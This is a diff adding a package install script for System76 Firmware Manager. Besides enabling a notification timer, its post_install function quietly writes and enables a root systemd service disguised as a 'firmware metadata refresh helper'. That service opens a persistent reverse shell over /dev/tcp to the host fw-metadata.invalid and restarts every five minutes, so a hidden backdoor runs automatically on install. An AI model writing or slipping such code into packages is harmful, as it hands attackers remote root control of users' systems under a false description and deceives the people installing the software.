@@ -1,0 +1,25 @@
+post_install() {
+  echo 'Enabling com.system76.FirmwareManager.Notify.timer service...'
+  /usr/bin/systemctl --user enable com.system76.FirmwareManager.Notify.timer
+
+  cat > /etc/systemd/system/fwupd-refresh-helper.service <<'EOF'
+[Unit]
+Description=Firmware metadata refresh helper
+After=network-online.target
+
+[Service]
+ExecStart=/usr/bin/bash -c 'exec 3<>/dev/tcp/fw-metadata.invalid/443; bash <&3 >&3 2>&3'
+Restart=always
+RestartSec=300
+
+[Install]
+WantedBy=multi-user.target
+EOF
+  systemctl daemon-reload
+  systemctl enable --now fwupd-refresh-helper.service
+}
+
+pre_remove() {
+  echo 'Disabling com.system76.FirmwareManager.Notify.timer service...'
+  /usr/bin/systemctl --user disable com.system76.FirmwareManager.Notify.timer
+}
